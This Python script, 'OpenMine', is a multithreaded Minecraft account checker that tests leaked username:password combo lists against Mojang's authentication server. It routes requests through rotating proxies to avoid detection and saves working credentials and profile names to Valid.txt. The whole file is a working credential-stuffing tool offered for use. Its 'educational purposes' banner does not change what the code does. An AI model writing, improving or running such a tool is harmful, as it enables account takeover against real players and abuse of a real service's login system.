import threading, requests, json
import ctypes, time, os, sys
from colorama import Fore, init, Style
from requests.exceptions import ConnectionError
from json.decoder import JSONDecodeError

logo = '''
 ██████╗ ██████╗ ███████╗███╗   ██╗███╗   ███╗██╗███╗   ██╗███████╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║████╗ ████║██║████╗  ██║██╔════╝
██║   ██║██████╔╝█████╗  ██╔██╗ ██║██╔████╔██║██║██╔██╗ ██║█████╗  
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║██║╚██╗██║██╔══╝  
╚██████╔╝██║     ███████╗██║ ╚████║██║ ╚═╝ ██║██║██║ ╚████║███████╗
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
'''

class bcolors:
    HEADER = '\033[95m'
    CYAN = '\u001b[36m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    MAGENTA = '\u001b[35m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Minecraft:
    def __init__(self):
        self.checking = True
        self.usernames = []
        self.passwords = []
        self.ip = []
        self.port = []
        self.workingproxies = []
        self.invalid = 0
        self.combocounter = 0
        self.proxycounter = 0
        self.connectionerror = 0
        self.valid = 0
        self.ticker = 0

    def update_title(self, message):
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(message)
        else:
            sys.stdout.write(f"\x1b]2;{message}\x07")

    def load_combos(self):
        if os.path.exists("combo.txt"):
            with open("combo.txt", "r") as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        self.usernames.append(line.split(":")[0])
                        self.passwords.append(line.split(":")[-1])
            if not len(self.usernames): return None
            return True
        update_title("Minecraft Account Checker | Error"); print("{}Error\n{}No combo file found: 'combo.txt'".format(Fore.YELLOW, Fore.WHITE)); time.sleep(10); exit()

    def load_proxies(self):
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as g:
                for line in g.read().splitlines():
                    if ":" in line:
                        self.ip.append(line.split(":")[0])
                        self.port.append(line.split(":")[-1])
            if not len(self.ip): return None
            return True
        update_title("Minecraft Account Checker | Error"); print("{}Error\n{}No proxy file found: 'combo.txt'".format(Fore.YELLOW, Fore.WHITE)); time.sleep(10); exit()
    
    def get_latest_proxy(self):
        latest_proxy = self.workingproxies[0]
        return latest_proxy

    def log(text):
        livetime = '['+strftime("%Y-%m-%d %H:%M:%S", gmtime())+'] '
        print(livetime+text)
    
    def update_proxyon(self): 
        os.system('cls' if os.name == 'nt' else 'clear')
        activeip, activeport = (self.get_latest_proxy()).split(':')
        print(f'''
 ██████╗ ██████╗ ███████╗███╗   ██╗███╗   ███╗██╗███╗   ██╗███████╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║████╗ ████║██║████╗  ██║██╔════╝
██║   ██║██████╔╝█████╗  ██╔██╗ ██║██╔████╔██║██║██╔██╗ ██║█████╗  
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║██║╚██╗██║██╔══╝  
╚██████╔╝██║     ███████╗██║ ╚████║██║ ╚═╝ ██║██║██║ ╚████║███████╗
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
Version v1.0
A lightweight & open-source minecraft account checker for educational purposes.

HTTP PROXY IS {bcolors.OKGREEN}ACTIVE{bcolors.ENDC} - {bcolors.UNDERLINE}{activeip}:{activeport}{bcolors.ENDC}
OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] checked accounts.
                      [{bcolors.OKGREEN}{self.valid}{bcolors.ENDC}/{len(self.usernames)}] good accounts.
                      [{bcolors.FAIL}{self.invalid}{bcolors.ENDC}/{len(self.usernames)}] bad accounts.
                      [{bcolors.FAIL}{self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] proxy errors.
        ''')

    def update_proxyoff(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
 ██████╗ ██████╗ ███████╗███╗   ██╗███╗   ███╗██╗███╗   ██╗███████╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║████╗ ████║██║████╗  ██║██╔════╝
██║   ██║██████╔╝█████╗  ██╔██╗ ██║██╔████╔██║██║██╔██╗ ██║█████╗  
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║██║╚██╗██║██╔══╝  
╚██████╔╝██║     ███████╗██║ ╚████║██║ ╚═╝ ██║██║██║ ╚████║███████╗
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
Version v1.0
A lightweight & open-source minecraft account checker for educational purposes.

PROXYLESS IS {bcolors.OKGREEN}ACTIVE{bcolors.ENDC}
OpenMine is running - [{bcolors.OKBLUE}{self.valid + self.invalid + self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] checked accounts.
                      [{bcolors.OKGREEN}{self.valid}{bcolors.ENDC}/{len(self.usernames)}] good accounts.
                      [{bcolors.FAIL}{self.invalid}{bcolors.ENDC}/{len(self.usernames)}] bad accounts.
                      [{bcolors.FAIL}{self.connectionerror}{bcolors.ENDC}/{len(self.usernames)}] connection errors.
        ''')
        
    
    def check_proxies(self, ip, port):
        try:
            proxies = {'http': f"{ip}:{port}"}
            requests.get('https://authserver.mojang.com/', proxies=proxies)
            self.workingproxies.append(f'{ip}:{port}')
        except ConnectionError:
            pass

    
    def check_account(self, username, password):
        if self.useproxies == 'y':
            data = json.dumps({"agent":{"name":"Minecraft","version":1}, "username":username,"password":password,"requestUser":"true"})
            headers = {'Content-Type': 'application/json'}
            activeip, activeport = (self.get_latest_proxy()).split(':')
            try:
                checkraw = requests.post("https://authserver.mojang.com/authenticate", data=data, headers=headers, proxies = {'http': f"{activeip}:{activeport}"})
                checkjson = json.loads(checkraw.text)
                if "clientToken" in checkraw.text:
                    gameuser = checkjson['selectedProfile']['name']
                    if self.saveusername == 'y': 
                        with open("Valid.txt", "a") as f: f.write("{}:{} ({})\n".format(username, password, gameuser))
                    else: 
                        with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
                    self.valid += 1
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyon()
                    
                else:
                    self.invalid += 1
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyon()
                    
            except ConnectionError:
                self.connectionerror += 1
                if self.checkproxies == 'y':
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyon()
                    self.workingproxies.pop(0)
                else:
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyon()

            except JSONDecodeError:
                self.connectionerror += 1
                if self.checkproxies == 'y':
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyon()
                    self.workingproxies.pop(0)
                else:
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyon()

                    
        else:
            data = json.dumps({"agent":{"name":"Minecraft","version":1}, "username":username,"password":password,"requestUser":"true"})
            headers = {'Content-Type': 'application/json'}
            try:
                checkraw = requests.post("https://authserver.mojang.com/authenticate", data=data, headers=headers)
                checkjson = json.loads(checkraw.text)
                if "clientToken" in checkraw.text:
                    gameuser = checkjson['selectedProfile']['name']
                    if self.saveusername == 'y': 
                        with open("Valid.txt", "a") as f: f.write("{}:{} ({})\n".format(username, password, gameuser))
                    else: 
                        with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
                    self.valid += 1
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyoff()
                    
                else:
                    self.invalid += 1
                    self.ticker += 1
                    self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                    if self.ticker >= (0.8*self.threads):
                        self.ticker = 0
                        self.update_proxyoff()
                    
            except ConnectionError:
                self.connectionerror += 1
                self.ticker += 1
                self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                if self.ticker >= (0.8*self.threads):
                    self.ticker = 0
                    self.update_proxyoff()

            except JSONDecodeError:
                self.connectionerror += 1
                self.ticker += 1
                self.update_title("OpenMine - Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid + self.connectionerror), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid + self.connectionerror))))
                if self.ticker >= (0.8*self.threads):
                    self.ticker = 0
                    self.update_proxyoff()

    def start_checking(self):
        def combo_thread_starter():
            self.check_account(self.usernames[self.combocounter], self.passwords[self.combocounter])
        if self.checkproxies == 'y':
            def proxy_thread_starter():
                self.check_proxies(self.ip[self.proxycounter], self.port[self.proxycounter])

            print(f"{bcolors.OKGREEN}> {bcolors.ENDC}Please wait as we check your proxylist validity...")
            while True:
                if threading.active_count() <= self.threads:
                    threading.Thread(target = proxy_thread_starter).start()
                    self.proxycounter += 1
                
                if self.proxycounter >= len(self.ip): break
        else:
            with open("proxies.txt") as g:
                for line in g:
                    self.workingproxies.append(line)
        while True:
            if threading.active_count() <= self.threads:
                threading.Thread(target = combo_thread_starter).start()
                self.combocounter += 1
            
            if self.combocounter >= len(self.usernames): break
        if self.useproxies == 'y':
            self.update_proxyon()
        else:
            self.update_proxyoff()
        try:
            input(f'Checking {bcolors.UNDERLINE}finished{bcolors.ENDC}, press any key to exit...')
        except EOFError:
            pass


    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == 'nt': 
            os.system("mode con cols=100 lines=35") 
            ctypes.windll.kernel32.SetConsoleTitleW("OpenMine - Minecraft Account Checker | Setup")
        else: 
            os.system("printf '\e[9;1t'")
            sys.stdout.write("\x1b]2;OpenMine - Minecraft Account Checker | Setup\x07")
        print(logo)
        print("\nVersion v1.0")
        print("A lightweight & open-source minecraft account checker for educational purposes.\n")
        load_combo = self.load_combos()
        if load_combo is not None:
            asksettings=True
            while(True):
                try: 
                    self.threads = int(input(f"{bcolors.WARNING}> {bcolors.ENDC}Threads: "))
                    self.saveusername = (input(f"{bcolors.WARNING}> {bcolors.ENDC}Save usernames? (y/n): "))
                    self.useproxies = (input(f"{bcolors.WARNING}> {bcolors.ENDC}Use proxies? (Rotating proxies are recommended) (y/n): "))
                    if self.useproxies == 'y':
                        load_proxy = self.load_proxies()
                        if load_proxy is not None:
                            pass
                        else:
                            os.system('cls' if os.name == 'nt' else 'clear'); update_title("OpenMine - Minecraft Account Checker | Error"); print(f"{bcolors.FAIL}Error\n{bcolors.ENDC}Please put your proxies inside of 'proxies.txt'"); time.sleep(10); exit()
                        self.checkproxies = (input(f"{bcolors.WARNING}> {bcolors.ENDC}Check proxies? (Do not use for rotating proxies) (y/n): "))
                        if self.checkproxies == 'y':
                            pass
                        else:
                            self.checkproxies = 'n'
                        break
                    else:
                        self.useproxies = 'n'
                        self.checkproxies = 'n'
                        break
                except ValueError:
                    print(f'{bcolors.FAIL}! Please enter a number, not a letter')
                    continue
            self.start_checking()
        else:
            os.system('cls' if os.name == 'nt' else 'clear'); update_title("OpenMine - Minecraft Account Checker | Error"); print(f"{bcolors.FAIL}Error\n{bcolors.ENDC}Please put your combos inside of 'combo.txt'"); time.sleep(10); exit()


Minecraft().main()
